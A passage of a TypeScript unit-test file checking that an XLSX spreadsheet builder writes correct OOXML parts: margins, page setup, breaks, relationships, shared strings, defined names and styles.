  it("writes no <f> element at all for a cell with no formula", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "number", value: 5 },
          displayText: "5",
        },
      ]),
    );
    expect(childrenWithTag(writtenCell(pkg, "A1"), "f")).toHaveLength(0);
  });
});

describe("renderString/renderTemporal: the formula-result and undefined-serial branches", () => {
  it('writes a formula\'s own cached STRING result inline as t="str", never shared-string-indexed, even for a repeated value', () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "same" },
          formula: '"same"',
          displayText: "same",
        },
        {
          row: 0,
          column: 1,
          value: { kind: "string", value: "same" },
          displayText: "same",
        },
      ]),
    );
    expect(attr(writtenCell(pkg, "A1"), "t")).toBe("str");
    expect(attr(writtenCell(pkg, "B1"), "t")).toBe("s");
    // Only the literal cell interned into sharedStrings -- the formula's own cached text did not.
    const sharedStrings = rootElement(pkg.parts["xl/sharedStrings.xml"]);
    if (sharedStrings === undefined) {
      throw new Error("expected xl/sharedStrings.xml to have a root element");
    }
    expect(childrenWithTag(sharedStrings, "si")).toHaveLength(1);
  });

  it("degrades an unparseable date to text via renderString's OWN formula-result branch, writing t=\"str\" when the temporal value is itself a formula's cached result", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "date", value: "not-a-real-date" },
          formula: "TODAY()",
          displayText: "not-a-real-date",
        },
      ]),
    );
    const cell = writtenCell(pkg, "A1");
    expect(attr(cell, "t")).toBe("str");
    expect(textContent(requireChild(cell, "v"))).toBe("not-a-real-date");
  });
});

describe("buildSheetPrElement: fitToPage reflects whether fitToPages is actually present", () => {
  it('writes pageSetUpPr fitToPage="true" when the sheet declares fitToPages', () => {
    const pkg = buildXlsxPackageFromContent(SUMMARY_ONLY_DOCUMENT());
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const sheetPr = requireChild(worksheet, "sheetPr");
    expect(attr(requireChild(sheetPr, "pageSetUpPr"), "fitToPage")).toBe(
      "true",
    );
  });

  it('writes pageSetUpPr fitToPage="false" when the sheet declares no fitToPages', () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const sheetPr = requireChild(worksheet, "sheetPr");
    expect(attr(requireChild(sheetPr, "pageSetUpPr"), "fitToPage")).toBe(
      "false",
    );
  });
});

function SUMMARY_ONLY_DOCUMENT(): ContentDocument {
  return { kind: "spreadsheet", metadata: {}, sheets: [SUMMARY_SHEET] };
}

// --- print settings: margins, page setup, and manual breaks --------------------------------------------------------

describe("buildPageMarginsElement/ptToInches: writes the genuine points-to-inches conversion, not a fabricated one", () => {
  it("converts 72pt margins to exactly 1 inch on every side, and the fixed 0.5in header/footer margin", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const margins = requireChild(worksheet, "pageMargins");
    expect(attr(margins, "left")).toBe("1");
    expect(attr(margins, "right")).toBe("1");
    expect(attr(margins, "top")).toBe("1");
    expect(attr(margins, "bottom")).toBe("1");
    expect(attr(margins, "header")).toBe("0.3");
    expect(attr(margins, "footer")).toBe("0.3");
  });

  it("converts non-72pt margins proportionally, not with a fixed or fabricated ratio", () => {
    const pkg = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: {
            ...DEFAULT_PRINT_SETTINGS,
            margins: { topPt: 36, rightPt: 18, bottomPt: 144, leftPt: 9 },
          },
        },
      ],
    });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const margins = requireChild(worksheet, "pageMargins");
    expect(attr(margins, "top")).toBe("0.5");
    expect(attr(margins, "right")).toBe("0.25");
    expect(attr(margins, "bottom")).toBe("2");
    expect(attr(margins, "left")).toBe("0.125");
  });
});

describe("buildPageSetupElement: paperSize vs paperWidth/paperHeight, orientation, and scale/fitToWidth/fitToHeight defaults", () => {
  function pageSetupOf(pageSize: {
    widthPt: number;
    heightPt: number;
  }): XmlElement {
    const pkg = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: { ...DEFAULT_PRINT_SETTINGS, pageSize },
        },
      ],
    });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    return requireChild(worksheet, "pageSetup");
  }

  it('writes paperSize (the recognised code), no paperWidth/paperHeight, and orientation="portrait" for a standard, taller-than-wide page', () => {
    const pageSetup = pageSetupOf({ widthPt: 612, heightPt: 792 }); // US Letter
    expect(attr(pageSetup, "paperSize")).toBe("1");
    expect(attr(pageSetup, "paperWidth")).toBeUndefined();
    expect(attr(pageSetup, "paperHeight")).toBeUndefined();
    expect(attr(pageSetup, "orientation")).toBe("portrait");
  });

  it('writes paperWidth/paperHeight, no paperSize, and orientation="landscape" for a custom, wider-than-tall page', () => {
    const pageSetup = pageSetupOf({ widthPt: 500, heightPt: 300 });
    expect(attr(pageSetup, "paperSize")).toBeUndefined();
    expect(attr(pageSetup, "paperWidth")).toBeDefined();
    expect(attr(pageSetup, "paperHeight")).toBeDefined();
    expect(attr(pageSetup, "orientation")).toBe("landscape");
  });

  it('writes scale="100", fitToWidth="1", fitToHeight="1" as the genuine defaults when neither scalePercent nor fitToPages is declared', () => {
    const pageSetup = pageSetupOf({ widthPt: 612, heightPt: 792 });
    expect(attr(pageSetup, "scale")).toBe("100");
    expect(attr(pageSetup, "fitToWidth")).toBe("1");
    expect(attr(pageSetup, "fitToHeight")).toBe("1");
  });

  it("writes the declared scalePercent and fitToPages verbatim when they are present, not the defaults", () => {
    const pkg = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: {
            ...DEFAULT_PRINT_SETTINGS,
            scalePercent: 80,
            fitToPages: { width: 2, height: 5 },
          },
        },
      ],
    });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const pageSetup = requireChild(worksheet, "pageSetup");
    expect(attr(pageSetup, "scale")).toBe("80");
    expect(attr(pageSetup, "fitToWidth")).toBe("2");
    expect(attr(pageSetup, "fitToHeight")).toBe("5");
  });
});

describe("buildBreaksElements: manual row and column breaks are written independently of each other", () => {
  function pkgWithBreaks(manualBreaks: {
    rows: number[];
    columns: number[];
  }): Package {
    return buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: { ...DEFAULT_PRINT_SETTINGS, manualBreaks },
        },
      ],
    });
  }

  it("writes rowBreaks with the exact id/min/max/man attributes and count/manualBreakCount, no colBreaks at all, for row breaks alone", () => {
    const pkg = pkgWithBreaks({ rows: [3, 7], columns: [] });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(worksheet, "colBreaks")).toHaveLength(0);
    const rowBreaks = requireChild(worksheet, "rowBreaks");
    expect(attr(rowBreaks, "count")).toBe("2");
    expect(attr(rowBreaks, "manualBreakCount")).toBe("2");
    const brks = elementsOf(rowBreaks, "brk");
    expect(brks.map((brk) => attributeOf(brk, "id"))).toEqual(["3", "7"]);
    const first = brks[0];
    if (first === undefined) {
      throw new Error("expected the first <brk>");
    }
    expect(attributeOf(first, "min")).toBe("0");
    expect(attributeOf(first, "max")).toBe("16383");
    expect(attributeOf(first, "man")).toBe("1");
  });

  it("writes colBreaks with the exact id/min/max/man attributes and count/manualBreakCount, no rowBreaks at all, for column breaks alone", () => {
    const pkg = pkgWithBreaks({ rows: [], columns: [2] });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(worksheet, "rowBreaks")).toHaveLength(0);
    const colBreaks = requireChild(worksheet, "colBreaks");
    expect(attr(colBreaks, "count")).toBe("1");
    expect(attr(colBreaks, "manualBreakCount")).toBe("1");
    const brk = elementsOf(colBreaks, "brk")[0];
    if (brk === undefined) {
      throw new Error("expected a <brk>");
    }
    expect(attributeOf(brk, "id")).toBe("2");
    expect(attributeOf(brk, "min")).toBe("0");
    expect(attributeOf(brk, "max")).toBe("1048575");
    expect(attributeOf(brk, "man")).toBe("1");
  });

  it("writes neither rowBreaks nor colBreaks when manualBreaks is undefined, and neither when both arrays are empty", () => {
    const noBreaks = rootElement(
      buildXlsxPackageFromContent(singleSheetDocument([])).parts[
        "xl/worksheets/sheet1.xml"
      ],
    );
    if (noBreaks === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(noBreaks, "rowBreaks")).toHaveLength(0);
    expect(childrenWithTag(noBreaks, "colBreaks")).toHaveLength(0);

    const emptyBreaks = rootElement(
      pkgWithBreaks({ rows: [], columns: [] }).parts[
        "xl/worksheets/sheet1.xml"
      ],
    );
    if (emptyBreaks === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(emptyBreaks, "rowBreaks")).toHaveLength(0);
    expect(childrenWithTag(emptyBreaks, "colBreaks")).toHaveLength(0);
  });
});

describe("buildWorksheetPart: element presence for cols, mergeCells, drawing, and tableParts, and buildWorksheetRelsPart's own root", () => {
  it("writes cols, mergeCells, drawing, and tableParts all together, and no more than one of each, for a sheet carrying every optional feature", () => {
    const pkg = buildXlsxPackageFromContent(
      {
        kind: "spreadsheet",
        metadata: {},
        sheets: [
          {
            name: "Sheet1",
            cells: [
              {
                row: 0,
                column: 0,
                value: { kind: "string", value: "x" },
                displayText: "x",
                colSpan: 2,
              },
            ],
            columns: [{ index: 0, widthPt: 50 }],
            rows: [],
            images: [
              {
                kind: "image",
                format: "png",
                base64: TINY_PNG_BASE64,
                widthPt: 10,
                heightPt: 10,
                anchorRow: 1,
                anchorColumn: 0,
                offsetXPt: 0,
                offsetYPt: 0,
              },
            ],
            printSettings: DEFAULT_PRINT_SETTINGS,
          },
        ],
      },
      { definitions: tableDefinitions() },
    );
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(worksheet.tag).toBe("worksheet");
    expect(attr(worksheet, "xmlns")).toBe(
      "http://schemas.openxmlformats.org/spreadsheetml/2006/main",
    );
    expect(attr(worksheet, "xmlns:r")).toBe(
      "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
    );
    expect(childrenWithTag(worksheet, "cols")).toHaveLength(1);
    expect(childrenWithTag(worksheet, "mergeCells")).toHaveLength(1);
    const drawing = requireChild(worksheet, "drawing");
    expect(attr(drawing, "r:id")).toBeDefined();
    const tableParts = requireChild(worksheet, "tableParts");
    expect(attr(tableParts, "count")).toBe("1");
    expect(attr(requireChild(tableParts, "tablePart"), "r:id")).toBeDefined();

    const rels = rootElement(pkg.parts["xl/worksheets/_rels/sheet1.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected the worksheet rels part to have a root element",
      );
    }
    expect(rels.tag).toBe("Relationships");
    expect(attr(rels, "xmlns")).toBe(
      "http://schemas.openxmlformats.org/package/2006/relationships",
    );
  });

  it("writes no cols, mergeCells, drawing, or tableParts at all for a plain sheet with none of those features", () => {
    const worksheet = rootElement(
      buildXlsxPackageFromContent(singleSheetDocument([])).parts[
        "xl/worksheets/sheet1.xml"
      ],
    );
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(worksheet, "cols")).toHaveLength(0);
    expect(childrenWithTag(worksheet, "mergeCells")).toHaveLength(0);
    expect(childrenWithTag(worksheet, "drawing")).toHaveLength(0);
    expect(childrenWithTag(worksheet, "tableParts")).toHaveLength(0);
  });
});

// --- entry point: per-sheet table filtering, sequential relationship ids, and multi-format image usage ------------

describe("buildXlsxPackageFromContent: a table definitions entry attaches only to its own named sheet, never to any other", () => {
  it("writes tableParts and xl/tables/table1.xml for the sheet the table names, and neither for a second, unrelated sheet", () => {
    const pkg = buildXlsxPackageFromContent(
      {
        kind: "spreadsheet",
        metadata: {},
        sheets: [
          {
            name: "Sheet1",
            cells: [],
            columns: [],
            rows: [],
            images: [],
            printSettings: DEFAULT_PRINT_SETTINGS,
          },
          {
            name: "Other",
            cells: [],
            columns: [],
            rows: [],
            images: [],
            printSettings: DEFAULT_PRINT_SETTINGS,
          },
        ],
      },
      { definitions: tableDefinitions() },
    );
    const sheet1 = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    const sheet2 = rootElement(pkg.parts["xl/worksheets/sheet2.xml"]);
    if (sheet1 === undefined || sheet2 === undefined) {
      throw new Error("expected both worksheet root elements");
    }
    expect(childrenWithTag(sheet1, "tableParts")).toHaveLength(1);
    expect(childrenWithTag(sheet2, "tableParts")).toHaveLength(0);
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/worksheets/_rels/sheet2.xml.rels",
    );
  });
});

describe("buildXlsxPackageFromContent: worksheet relationships are numbered sequentially across comments, drawing, and tables on the same sheet", () => {
  it("assigns rId1/rId2/rId3 in the order comments, drawing, and table relationships are added, with no gap or repeat", () => {
    const pkg = buildXlsxPackageFromContent(
      {
        kind: "spreadsheet",
        metadata: {},
        sheets: [
          {
            name: "Sheet1",
            cells: [
              {
                row: 0,
                column: 0,
                value: { kind: "string", value: "x" },
                displayText: "x",
                comment: { text: "note" },
              },
            ],
            columns: [],
            rows: [],
            images: [
              {
                kind: "image",
                format: "png",
                base64: TINY_PNG_BASE64,
                widthPt: 10,
                heightPt: 10,
                anchorRow: 0,
                anchorColumn: 0,
                offsetXPt: 0,
                offsetYPt: 0,
              },
            ],
            printSettings: DEFAULT_PRINT_SETTINGS,
          },
        ],
      },
      { definitions: tableDefinitions() },
    );
    const rels = rootElement(pkg.parts["xl/worksheets/_rels/sheet1.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected the worksheet rels part to have a root element",
      );
    }
    const relationships = childrenWithTag(rels, "Relationship");
    expect(relationships.map((el) => attr(el, "Id"))).toEqual([
      "rId1",
      "rId2",
      "rId3",
    ]);
    const types = relationships.map((el) => attr(el, "Type"));
    expect(types[0]).toContain("threadedComment");
    expect(types[1]).toContain("/drawing");
    expect(types[2]).toContain("/table");
  });
});

describe("buildXlsxPackageFromContent: usedImageFormats collects every distinct image format actually used, and only those", () => {
  it("declares a Default entry for both png and jpeg when a sheet carries one image of each, and none for gif", () => {
    const pkg = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [
            {
              kind: "image",
              format: "png",
              base64: TINY_PNG_BASE64,
              widthPt: 10,
              heightPt: 10,
              anchorRow: 0,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
            {
              kind: "image",
              format: "jpeg",
              base64: TINY_PNG_BASE64,
              widthPt: 10,
              heightPt: 10,
              anchorRow: 1,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
          ],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    });
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const extensions = childrenWithTag(contentTypes, "Default").map((el) =>
      attr(el, "Extension"),
    );
    expect(extensions).toContain("png");
    expect(extensions).toContain("jpeg");
    expect(extensions).not.toContain("gif");
    expect(Object.keys(pkg.parts)).toContain("xl/media/image1.png");
    expect(Object.keys(pkg.parts)).toContain("xl/media/image2.jpeg");
  });
});

describe("buildXlsxPackageFromContent: [Content_Types].xml carries no chart/table overrides at all for a document with neither", () => {
  it("writes no /xl/charts/ or /xl/tables/ Override, and no chart/table Default extensions, for a plain document", () => {
    const pkg = buildXlsxPackageFromContent(DOCUMENT);
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const overrides = childrenWithTag(contentTypes, "Override").map((el) =>
      attr(el, "PartName"),
    );
    expect(overrides.some((name) => name?.startsWith("/xl/charts/"))).toBe(
      false,
    );
    expect(overrides.some((name) => name?.startsWith("/xl/tables/"))).toBe(
      false,
    );
  });
});

describe("buildXlsxPackageFromContent: workbook, relationship, and shared-string part exactness", () => {
  function documentOfSheets(sheets: ContentSheet[]): ContentDocument {
    return { kind: "spreadsheet", metadata: {}, sheets };
  }

  it("numbers each sheet element, its worksheet relationship, and its worksheet part sequentially", () => {
    const pkg = buildXlsxPackageFromContent(
      documentOfSheets([emptySheetFixture("Alpha"), emptySheetFixture("Beta")]),
    );
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected workbook root");
    }
    const sheetsElement = requireChild(workbook, "sheets");
    expect(
      elementsOf(sheetsElement, "sheet").map((sheet) => [
        attributeOf(sheet, "name"),
        attributeOf(sheet, "sheetId"),
        attributeOf(sheet, "r:id"),
      ]),
    ).toEqual([
      ["Alpha", "1", "rId1"],
      ["Beta", "2", "rId2"],
    ]);
    expect(attr(workbook, "xmlns")).toBe(
      "http://schemas.openxmlformats.org/spreadsheetml/2006/main",
    );
    const relsRoot = rootElement(pkg.parts["xl/_rels/workbook.xml.rels"]);
    if (relsRoot === undefined) {
      throw new Error("expected workbook rels root");
    }
    expect(
      elementsOf(relsRoot, "Relationship").map((rel) => [
        attributeOf(rel, "Id"),
        attributeOf(rel, "Type"),
        attributeOf(rel, "Target"),
      ]),
    ).toEqual([
      [
        "rId1",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        "worksheets/sheet1.xml",
      ],
      [
        "rId2",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        "worksheets/sheet2.xml",
      ],
      [
        "rId3",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles",
        "styles.xml",
      ],
      [
        "rId4",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings",
        "sharedStrings.xml",
      ],
    ]);
    expect(Object.keys(pkg.parts)).toEqual(
      expect.arrayContaining([
        "xl/worksheets/sheet1.xml",
        "xl/worksheets/sheet2.xml",
      ]),
    );
  });

  it("omits the definedNames element entirely when no sheet derives a name and the document carries none", () => {
    const pkg = buildXlsxPackageFromContent(
      documentOfSheets([emptySheetFixture("Only")]),
    );
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected workbook root");
    }
    expect(childrenWithTag(workbook, "definedNames")).toHaveLength(0);
  });

  it("derives the reserved print-area and print-titles definedNames with their sheet-local scope ids", () => {
    const sheet: ContentSheet = {
      ...emptySheetFixture("Printed"),
      printSettings: {
        ...DEFAULT_PRINT_SETTINGS,
        printRange: { startRow: 0, startColumn: 0, endRow: 4, endColumn: 1 },
        repeatRows: { start: 0, end: 1 },
      },
    };
    const pkg = buildXlsxPackageFromContent(documentOfSheets([sheet]));
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected workbook root");
    }
    const definedNames = requireChild(workbook, "definedNames");
    expect(
      elementsOf(definedNames, "definedName").map((name) => [
        attributeOf(name, "name"),
        attributeOf(name, "localSheetId"),
        textContent(name),
      ]),
    ).toEqual([
      ["_xlnm.Print_Area", "0", "Printed!$A$1:$B$5"],
      ["_xlnm.Print_Titles", "0", "Printed!$1:$2"],
    ]);
  });

  it("writes the shared-strings part with matching count and uniqueCount and space-preserving text elements", () => {
    const pkg = buildXlsxPackageFromContent(
      documentOfSheets([
        {
          ...emptySheetFixture("Sheet1"),
          cells: [
            {
              row: 0,
              column: 0,
              value: { kind: "string", value: "repeat me" },
              displayText: "repeat me",
            },
            {
              row: 1,
              column: 0,
              value: { kind: "string", value: "repeat me" },
              displayText: "repeat me",
            },
          ],
        },
      ]),
    );
    const sharedStrings = rootElement(pkg.parts["xl/sharedStrings.xml"]);
    if (sharedStrings === undefined) {
      throw new Error("expected shared strings root");
    }
    expect(attr(sharedStrings, "count")).toBe("1");
    expect(attr(sharedStrings, "uniqueCount")).toBe("1");
    const entries = elementsOf(sharedStrings, "si");
    expect(entries).toHaveLength(1);
    const text = requireChild(entries[0]!, "t");
    expect(attr(text, "xml:space")).toBe("preserve");
    expect(textContent(text)).toBe("repeat me");
  });

  it("declares the fixed package rels and content-type defaults with their exact types", () => {
    const pkg = buildXlsxPackageFromContent(
      documentOfSheets([emptySheetFixture("S")]),
    );
    const packageRels = rootElement(pkg.parts["_rels/.rels"]);
    if (packageRels === undefined) {
      throw new Error("expected package rels root");
    }
    expect(
      elementsOf(packageRels, "Relationship").map((rel) => [
        attributeOf(rel, "Id"),
        attributeOf(rel, "Type"),
        attributeOf(rel, "Target"),
      ]),
    ).toEqual([
      [
        "rId1",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
        "xl/workbook.xml",
      ],
      [
        "rId2",
        "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
        "docProps/core.xml",
      ],
      [
        "rId3",
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties",
        "docProps/app.xml",
      ],
    ]);
    const types = rootElement(pkg.parts["[Content_Types].xml"]);
    if (types === undefined) {
      throw new Error("expected content types root");
    }
    expect(
      elementsOf(types, "Default").map((entry) => [
        attributeOf(entry, "Extension"),
        attributeOf(entry, "ContentType"),
      ]),
    ).toEqual([
      ["rels", "application/vnd.openxmlformats-package.relationships+xml"],
      ["xml", "application/xml"],
    ]);
    expect(
      elementsOf(types, "Override").map((entry) =>
        attributeOf(entry, "PartName"),
      ),
    ).toEqual(
      expect.arrayContaining([
        "/xl/workbook.xml",
        "/xl/styles.xml",
        "/xl/sharedStrings.xml",
        "/xl/worksheets/sheet1.xml",
        "/docProps/core.xml",
        "/docProps/app.xml",
      ]),
    );
  });
});

// A one-empty-sheet ContentSheet matching singleSheetDocument's own shape, for fixtures that mutate the sheet rather than the cells.
function emptySheetFixture(name: string): ContentSheet {
  return {
    name,
    cells: [],
    columns: [],
    rows: [],
    images: [],
    printSettings: DEFAULT_PRINT_SETTINGS,
  };
}

describe("buildXlsxPackageFromContent: sheetData grouping, dimension, merges, and cols exactness", () => {
  it("sorts out-of-order cells into ascending rows and columns and keeps a row with no cells for its own height", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 2,
          column: 1,
          value: { kind: "number", value: 22 },
          displayText: "22",
        },
        {
          row: 0,
          column: 2,
          value: { kind: "number", value: 2 },
          displayText: "2",
        },
        {
          row: 0,
          column: 0,
          value: { kind: "number", value: 0 },
          displayText: "0",
        },
      ]),
    );
    const sheet: ContentSheet = {
      ...emptySheetFixture("Sheet1"),
      rows: [{ index: 1, heightPt: 24 }],
    };
    const pkg2 = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [sheet],
    });
    const worksheet2 = rootElement(pkg2.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet2 === undefined) {
      throw new Error("expected worksheet root");
    }
    const rows2 = elementsOf(requireChild(worksheet2, "sheetData"), "row");
    expect(
      rows2.map((row) => [
        attributeOf(row, "r"),
        attributeOf(row, "ht"),
        attributeOf(row, "customHeight"),
      ]),
    ).toEqual([["2", "24", "true"]]);

    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected worksheet root");
    }
    const rows = elementsOf(requireChild(worksheet, "sheetData"), "row");
    expect(
      rows.map((row) => [
        attributeOf(row, "r"),
        elementsOf(row, "c").map((cell) => attributeOf(cell, "r")),
      ]),
    ).toEqual([
      ["1", ["A1", "C1"]],
      ["3", ["B3"]],
    ]);
  });

  it("derives the dimension from whichever of cells, columns, and rows reaches furthest", () => {
    const dimensionOf = (sheet: ContentSheet): string => {
      const pkg = buildXlsxPackageFromContent({
        kind: "spreadsheet",
        metadata: {},
        sheets: [sheet],
      });
      const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
      if (worksheet === undefined) {
        throw new Error("expected worksheet root");
      }
      return attr(requireChild(worksheet, "dimension"), "ref") ?? "";
    };
    const base = emptySheetFixture("Sheet1");
    expect(dimensionOf(base)).toBe("A1");
    expect(
      dimensionOf({
        ...base,
        cells: [
          {
            row: 4,
            column: 2,
            value: { kind: "number", value: 1 },
            displayText: "1",
          },
        ],
      }),
    ).toBe("A1:C5");
    expect(dimensionOf({ ...base, columns: [{ index: 5, widthPt: 80 }] })).toBe(
      "A1:F1",
    );
    expect(dimensionOf({ ...base, rows: [{ index: 9, heightPt: 12 }] })).toBe(
      "A1:A10",
    );
  });

  it("writes each merge's ref from its own spans, one row-only and one column-only", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "wide" },
          displayText: "wide",
          colSpan: 3,
        },
        {
          row: 1,
          column: 0,
          value: { kind: "string", value: "tall" },
          displayText: "tall",
          rowSpan: 2,
        },
      ]),
    );
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected worksheet root");
    }
    const mergeCells = requireChild(worksheet, "mergeCells");
    expect(attr(mergeCells, "count")).toBe("2");
    expect(
      elementsOf(mergeCells, "mergeCell").map((cell) =>
        attributeOf(cell, "ref"),
      ),
    ).toEqual(["A1:C1", "A2:A3"]);
  });

  it("writes a hidden column with no width as hidden alone, and a widthed column with customWidth", () => {
    const pkg = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          ...emptySheetFixture("Sheet1"),
          columns: [
            { index: 0, hidden: true },
            { index: 1, widthPt: 96 },
          ],
        },
      ],
    });
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected worksheet root");
    }
    const cols = requireChild(worksheet, "cols");
    expect(
      elementsOf(cols, "col").map((col) => [
        attributeOf(col, "min"),
        attributeOf(col, "max"),
        attributeOf(col, "width") !== undefined,
        attributeOf(col, "customWidth"),
        attributeOf(col, "hidden"),
      ]),
    ).toEqual([
      ["1", "1", false, undefined, "true"],
      ["2", "2", true, "true", undefined],
    ]);
  });
});

describe("buildXlsxPackageFromContent: styles part scaffolding counts and exact reserved entries", () => {
  it("carries element counts equal to the element lists and the exact cellStyleXfs/cellStyles scaffolding", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
          font: { fontFamily: "Arial", sizePt: 12, bold: true },
        },
      ]),
    );
    const styles = styleSheetOf(pkg);
    for (const tag of ["fonts", "fills", "borders", "cellXfs"]) {
      const element = requireChild(styles, tag);
      expect(attr(element, "count")).toBe(
        String(
          elementsOf(element, tag === "cellXfs" ? "xf" : tag.slice(0, -1))
            .length,
        ),
      );
    }
    const cellStyleXfs = requireChild(styles, "cellStyleXfs");
    expect(attr(cellStyleXfs, "count")).toBe("1");
    expect(
      elementsOf(cellStyleXfs, "xf").map((xf) => [
        attributeOf(xf, "numFmtId"),
        attributeOf(xf, "fontId"),
        attributeOf(xf, "fillId"),
        attributeOf(xf, "borderId"),
      ]),
    ).toEqual([["0", "0", "0", "0"]]);
    const cellStyles = requireChild(styles, "cellStyles");
    expect(attr(cellStyles, "count")).toBe("1");
    expect(
      elementsOf(cellStyles, "cellStyle").map((style) => [
        attributeOf(style, "name"),
        attributeOf(style, "xfId"),
        attributeOf(style, "builtinId"),
      ]),
    ).toEqual([["Normal", "0", "0"]]);
    // The font element spells its toggles and size/name in CT_Font's own child order.
    const fonts = requireChild(styles, "fonts");
    const arial = elementsOf(fonts, "font")[1]!;
    expect(
      elementsOf(arial, "b").length +
        elementsOf(arial, "sz").length +
        elementsOf(arial, "name").length,
    ).toBe(3);
    expect(attr(requireChild(arial, "sz"), "val")).toBe("12");
    expect(attr(requireChild(arial, "name"), "val")).toBe("Arial");
  });
});

describe("buildXlsxPackageFromContent: the names array and the derived print names reconcile by name and scope", () => {
  function workbookWithNames(names: ContentDefinedName[]): Package {
    return buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      names,
      sheets: [
        {
          name: "Printed",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: {
            ...DEFAULT_PRINT_SETTINGS,
            printRange: {
              startRow: 0,
              startColumn: 0,
              endRow: 4,
              endColumn: 1,
            },
          },
        },
      ],
    });
  }

  function definedNameRows(
    pkg: Package,
  ): [string, string | undefined, string][] {
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected workbook root");
    }
    const definedNames = requireChild(workbook, "definedNames");
    return elementsOf(definedNames, "definedName").map((name) => [
      attributeOf(name, "name") ?? "",
